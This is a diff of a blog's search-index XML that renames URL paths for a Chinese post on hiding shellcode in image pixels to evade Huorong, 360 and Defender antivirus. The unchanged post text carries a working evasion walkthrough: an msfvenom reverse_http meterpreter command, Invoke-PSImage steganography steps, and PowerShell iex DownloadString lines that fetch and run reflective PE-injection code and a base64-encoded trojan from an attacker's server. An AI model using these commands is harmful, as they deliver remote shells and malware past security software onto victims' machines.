@@ -2770,10 +2770,10 @@
   </entry>
   <entry>
     <title>shellcode隐写RGB过火绒、360</title>
-    <url>/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/</url>
+    <url>/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/</url>
     <content><![CDATA[<p>cs篇将Shellcode隐写到正常BMP图片中，把字符串拆成字节，写入每个像素的alpha通道中，然后上传到可信任的网站下偏移拼接shellcode进行远程动态加载，能有效地增加了免杀性和隐匿性。</p>
 <p>首先在cs生成shellcode</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143523433.png" alt="image-20210826143523433"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143523433.png" alt="image-20210826143523433"></p>
 <h5 id="MSF篇"><a href="#MSF篇" class="headerlink" title="MSF篇"></a>MSF篇</h5><p>在msf生成ps文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.82.134LPORT=7788-fpsh-reflection&gt;msf.ps1</span><br></pre></td></tr></table></figure>
 
@@ -2782,44 +2782,44 @@
 <p>后面都一样</p>
 <p>将payload放在与Invoke-PSImage.ps1同一目录下</p>
 <p>提前准备一张图片用于生成包含shellcode的图片</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143547986.png" alt="image-20210826143547986"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143547986.png" alt="image-20210826143547986"></p>
 <p>在当前目录下打开powershell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted -Scope CurrentUser				//设置脚本策略</span><br><span class="line">Import-Module .\Invoke-PSimage.ps1									//导入脚本模块</span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\0range.png -Out .\0range.jpg -Web//生成用于远程加载的png图片</span><br></pre></td></tr></table></figure>
 
 
 
 <p>同时会生成一段powershll的shellcode</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143601038.png" alt="image-20210826143601038"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143601038.png" alt="image-20210826143601038"></p>
 <p>在公网服务器开启web服务，同时将上面生成的图片传到网站路径用于加载，生成的那段shellcode中的example.com改成自己web服务的地址就好</p>
 <p>本地运行后火绒和360正常过</p>
-<p>!<img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143623757.png" alt="image-20210826143623757"></p>
+<p>!<img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143623757.png" alt="image-20210826143623757"></p>
 <p>但是被defender拦了，尝试用海莲花加密，还是一样被拦截</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143637852.png" alt="image-20210826143637852"></p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143651364.png" alt="image-20210826143651364"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143637852.png" alt="image-20210826143637852"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143651364.png" alt="image-20210826143651364"></p>
 <p>看来简单的加密拆分混淆已经过不了defender了，得另寻他路</p>
 <p>看到有师傅Powershell内存中执行exe，试一试远程加载反射注入PE</p>
 <h6 id="本地编码payload"><a href="#本地编码payload" class="headerlink" title="本地编码payload"></a>本地编码payload</h6><p>powershell下执行将自己的马子改下路径</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">functionConvert-BinaryToString&#123;</span><br><span class="line">	[CmdletBinding()]param(</span><br><span class="line">	[string]$FilePath)</span><br><span class="line">	try&#123;</span><br><span class="line">	$ByteArray=[System.IO.File]::ReadAllBytes($FilePath);</span><br><span class="line">	&#125;</span><br><span class="line">	catch&#123;</span><br><span class="line">	throw&quot;Failedtoreadfile.Ensurethatyouhavepermissiontothefile,andthatthefilepathiscorrect.&quot;;&#125;</span><br><span class="line">	if($ByteArray)&#123;</span><br><span class="line">	$Base64String=[System.Convert]::ToBase64String($ByteArray);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">throw&#x27;$ByteArrayis$null.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">Write-Output-InputObject$Base64String;</span><br><span class="line">&#125;</span><br><span class="line">Convert-BinaryToStringE:\0.渗透工具\免杀\powershell\Invoke-Obfuscation-master\0range.ps1&gt;E:\res.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143704812.png" alt="image-20210826143704812"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143704812.png" alt="image-20210826143704812"></p>
 <h6 id="目标机器远程加载powerspolit的PE反射模块"><a href="#目标机器远程加载powerspolit的PE反射模块" class="headerlink" title="目标机器远程加载powerspolit的PE反射模块"></a>目标机器远程加载powerspolit的PE反射模块</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iex(New-ObjectNet.WebClient).DownloadString(&quot;http://服务器IP/Invoke-ReflectivePEInjection.ps1&quot;)</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826144726424.png" alt="image-20210826144726424"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826144726424.png" alt="image-20210826144726424"></p>
 <p>加密后显示字符过长。。。。</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826144807458.png" alt="image-20210826144807458"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826144807458.png" alt="image-20210826144807458"></p>
 <p>这里先跳过看看后面是否可以正常运行</p>
 <h6 id="继续加载base64编码后得payload"><a href="#继续加载base64编码后得payload" class="headerlink" title="继续加载base64编码后得payload"></a>继续加载base64编码后得payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b64Str=(New-ObjectNet.WebClient).DownloadString(&quot;http://xxxx/res.txt&quot;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143735521.png" alt="image-20210826143735521"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143735521.png" alt="image-20210826143735521"></p>
 <h6 id="解码payload"><a href="#解码payload" class="headerlink" title="解码payload"></a>解码payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PEBytes=[System.Convert]::FromBase64String($InputString)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143747842.png" alt="image-20210826143747842"></p>
-<h6 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h6><p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143801107.png" alt="image-20210826143801107"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143747842.png" alt="image-20210826143747842"></p>
+<h6 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h6><p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143801107.png" alt="image-20210826143801107"></p>
 <p>。。进行到这里又陷入了僵局</p>
 <p>一直在尝试免杀脚本内容，但是忽略了defender查杀前面的iex函数将iex换为别名Invoke-Expression也不可以</p>
-<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E5%9B%BD%E5%86%85%E6%9D%80%E8%BD%AF/image-20210826143814853.png" alt="image-20210826143814853"></p>
+<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143814853.png" alt="image-20210826143814853"></p>
 <p>Windows针对powershell的检测主要是AMSI接口。</p>
 <p>主要检测</p>
 <ol>
